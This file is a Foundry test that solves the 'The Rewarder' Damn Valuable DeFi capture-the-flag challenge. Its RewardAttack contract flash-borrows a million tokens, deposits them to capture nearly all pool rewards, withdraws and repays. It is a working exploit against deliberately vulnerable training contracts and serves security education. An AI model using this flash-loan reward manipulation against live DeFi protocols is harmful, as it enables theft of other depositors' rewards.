// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";

contract RewardAttack {
    FlashLoanerPool flashloanerpool;
    TheRewarderPool therewarderpool;
    DamnValuableToken dvt;
    RewardToken rewardToken;
    address owner;
    uint256 constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    constructor(FlashLoanerPool _flashloanerpool, TheRewarderPool _therewarderpool, DamnValuableToken _dvt, RewardToken _rewardToken) {
        flashloanerpool = _flashloanerpool;
        therewarderpool = _therewarderpool;
        dvt = _dvt;
        rewardToken = _rewardToken;
        owner = msg.sender;
    }

    function attack() external {
        // Calls flashloan and borrows all the tokens
        flashloanerpool.flashLoan(TOKENS_IN_LENDER_POOL);
    }

    function receiveFlashLoan(uint256 amount) external {
        // approval
        dvt.approve(address(therewarderpool), amount);
        // calls deposit to distribute rewards.
        therewarderpool.deposit(amount);
        // withdraw tokens
        therewarderpool.withdraw(amount);
        // transfer tokens back to flashloaner
        dvt.transfer(address(flashloanerpool), amount);
        // transfer reward tokens to attacker
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}

contract TheRewarder is Test {
    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    uint256 internal constant USER_DEPOSIT = 100e18;

    Utilities internal utils;
    FlashLoanerPool internal flashLoanerPool;
    TheRewarderPool internal theRewarderPool;
    DamnValuableToken internal dvt;
    address payable[] internal users;
    address payable internal attacker;
    address payable internal alice;
    address payable internal bob;
    address payable internal charlie;
    address payable internal david;

    function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(5);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];
        attacker = users[4];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        flashLoanerPool = new FlashLoanerPool(address(dvt));
        vm.label(address(flashLoanerPool), "Flash Loaner Pool");

        // Set initial token balance of the pool offering flash loans
        dvt.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);

        theRewarderPool = new TheRewarderPool(address(dvt));

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (uint8 i; i < 4; i++) {
            dvt.transfer(users[i], USER_DEPOSIT);
            vm.startPrank(users[i]);
            dvt.approve(address(theRewarderPool), USER_DEPOSIT);
            theRewarderPool.deposit(USER_DEPOSIT);
            assertEq(
                theRewarderPool.accToken().balanceOf(users[i]),
                USER_DEPOSIT
            );
            vm.stopPrank();
        }

        assertEq(theRewarderPool.accToken().totalSupply(), USER_DEPOSIT * 4);
        assertEq(theRewarderPool.rewardToken().totalSupply(), 0);

        // Advance time 5 days so that depositors can get rewards
        vm.warp(block.timestamp + 5 days); // 5 days

        for (uint8 i; i < 4; i++) {
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            assertEq(
                theRewarderPool.rewardToken().balanceOf(users[i]),
                25e18 // Each depositor gets 25 reward tokens
            );
        }

        assertEq(theRewarderPool.rewardToken().totalSupply(), 100e18);
        assertEq(dvt.balanceOf(attacker), 0); // Attacker starts with zero DVT tokens in balance
        assertEq(theRewarderPool.roundNumber(), 2); // Two rounds should have occurred so far

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    // forge test --match-contract TheRewarder
    function testExploit() public {
        /** EXPLOIT START **/
        // timeskip 5 days in order to claim rewards.
        vm.warp(block.timestamp + 5 days);
        // So we need to flashloan an absurd amount of DVT tokens
        // (1_000_000 tokens vs the 100 tokens the other users have)
        // which will allow us to take nearly all of the rewards for ourselves.
        vm.startPrank(attacker);
        RewardAttack rewardAttack = new RewardAttack(flashLoanerPool, theRewarderPool, dvt, theRewarderPool.rewardToken());
        rewardAttack.attack();
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(theRewarderPool.roundNumber(), 3); // Only one round should have taken place
        for (uint8 i; i < 4; i++) {
            // Users should get negligible rewards this round
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(
                users[i]
            );
            uint256 delta = rewardPerUser - 25e18;
            assertLt(delta, 1e16);
        }
        // Rewards must have been issued to the attacker account
        assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);
        uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(
            attacker
        );

        // The amount of rewards earned should be really close to 100 tokens
        uint256 deltaAttacker = 100e18 - rewardAttacker;
        assertLt(deltaAttacker, 1e17);

        // Attacker finishes with zero DVT tokens in balance
        assertEq(dvt.balanceOf(attacker), 0);
    }
}
